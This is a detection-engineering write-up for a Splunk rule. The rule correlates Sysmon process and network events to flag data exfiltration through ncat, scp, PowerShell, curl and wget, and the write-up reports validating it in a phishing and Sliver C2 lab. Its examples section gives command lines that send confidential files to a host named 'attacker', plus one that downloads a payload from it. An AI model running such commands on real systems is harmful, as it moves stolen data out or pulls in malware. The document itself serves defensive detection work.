# Data Exfiltration Detection

## Description

Detects potential data exfiltration activity using commonly abused command-line tools and outbound network connections.

Data exfiltration is often the final stage of an attack where an adversary transfers sensitive information from a compromised system to an external destination.

This detection correlates process execution and network connection activity to identify tools frequently used for file transfer and data theft.

Examples include:

- Ncat
- SCP
- PowerShell Invoke-WebRequest
- curl
- wget

The detection combines Sysmon process creation and network connection telemetry to improve confidence and reduce false positives.

---

## MITRE ATT&CK

| Tactic | Technique |
|----------|----------|
| Exfiltration | T1041 – Exfiltration Over C2 Channel |

Related Techniques:

- T1020 – Automated Exfiltration
- T1105 – Ingress Tool Transfer
- T1048 – Exfiltration Over Alternative Protocol

---

## Data Source

- Microsoft Sysmon Event ID 1 (Process Creation)
- Microsoft Sysmon Event ID 3 (Network Connection)

---

## Detection Logic

The rule identifies:

### Suspicious File Transfer Commands

- ncat
- scp
- Invoke-WebRequest
- iwr
- curl
- wget

### Suspicious Network Connections

Connections initiated by:

- ncat.exe
- scp.exe
- powershell.exe
- cmd.exe
- curl.exe
- wget.exe

The rule correlates process execution and outbound network activity using Process GUID values.

---

## SPL Detection

```spl
index=pc1

(
    (EventCode=1 (
        CommandLine="*ncat*"
        OR CommandLine="*scp*"
        OR CommandLine="*Invoke-WebRequest*"
        OR CommandLine="*iwr*"
        OR CommandLine="*curl*"
        OR CommandLine="*wget*"
    ))

    OR

    (EventCode=3 (
        Image="*\\ncat.exe"
        OR Image="*\\scp.exe"
        OR Image="*\\powershell.exe"
        OR Image="*\\cmd.exe"
        OR Image="*\\curl.exe"
        OR Image="*\\wget.exe"
    ))
)

| eval process_guid=coalesce(ProcessGuid, ProcessGUID)

| eval full_command=if(EventCode=1, CommandLine, null())

| stats
    min(_time) as _time
    max(_time) as lastTime
    values(full_command) as CommandLine
    values(Image) as Image
    values(DestinationIp) as DestinationIp
    values(DestinationPort) as DestinationPort
    values(User) as User
    count
    by process_guid host

| where cidrmatch("192.168.57.0/24", mvindex(DestinationIp,0))

| eval CommandLine=mvfilter(match(CommandLine,"ncat|scp|Invoke-WebRequest|iwr|curl|wget"))

| eval duration=lastTime-_time

| eval process=mvindex(Image,0)
| eval dest_ip=mvindex(DestinationIp,0)

| eval exfil_tool=case(
    like(CommandLine,"%ncat%"), "ncat",
    like(CommandLine,"%scp%"), "scp",
    like(CommandLine,"%Invoke-WebRequest%") OR like(CommandLine,"%iwr%"), "powershell",
    like(CommandLine,"%curl%"), "curl",
    like(CommandLine,"%wget%"), "wget"
)

| eval user=mvindex(User,-1)
| eval user=mvindex(split(user,"\\"),-1)

| eval alert_name="Data Exfiltration Activity"
| eval severity="critical"

| eval mitre_tactic="Exfiltration"
| eval mitre_technique="T1041"

| eval risk_score=100
| eval alert_type="endpoint"

| eval index_name="pc1"
| eval event_source="Sysmon"
| eval event_id="1,3"

| rename host as dest_host

| table _time dest_host user process exfil_tool dest_ip DestinationPort count duration CommandLine alert_name severity mitre_tactic mitre_technique risk_score alert_type index_name event_source event_id

| sort - _time
```

---

## Example Alert

Fields returned:

- User
- Host
- Process
- Exfiltration Tool
- Destination IP
- Destination Port
- Command Line
- Duration
- Risk Score
- MITRE ATT&CK Mapping

Example:

```text
User:
victim

Process:
ncat.exe

Exfiltration Tool:
ncat

Destination IP:
192.168.57.100

Destination Port:
4444

Risk Score:
100
```

---

## Detection Examples

### Ncat File Transfer

```cmd
ncat.exe 192.168.57.100 4444 < secrets.zip
```

### SCP Transfer

```bash
scp confidential.zip attacker@192.168.57.100:/tmp
```

### PowerShell Download/Upload

```powershell
Invoke-WebRequest -Uri http://attacker/payload.exe -OutFile payload.exe
```

### Curl Transfer

```bash
curl -T confidential.zip http://attacker/upload
```

---

## Why This Detection Matters

Most attacks ultimately aim to steal information.

Detecting exfiltration activity provides defenders with visibility into the attacker's end objective and can help prevent:

- Intellectual property theft
- Credential theft
- Sensitive file leakage
- Data breaches

By correlating process execution with network activity, the detection provides stronger evidence than monitoring either source independently.

---

## Lab Validation

This detection was validated during the phishing simulation portion of the SOC Automation & Detection Engineering Lab.

The attack chain included:

1. Initial phishing delivery
2. User execution of the payload
3. Sliver C2 access
4. File collection
5. Data exfiltration using Ncat

The resulting Sysmon process creation and network connection events successfully triggered Splunk alerts, generated SOC cases, and appeared within the Grafana investigation workflow.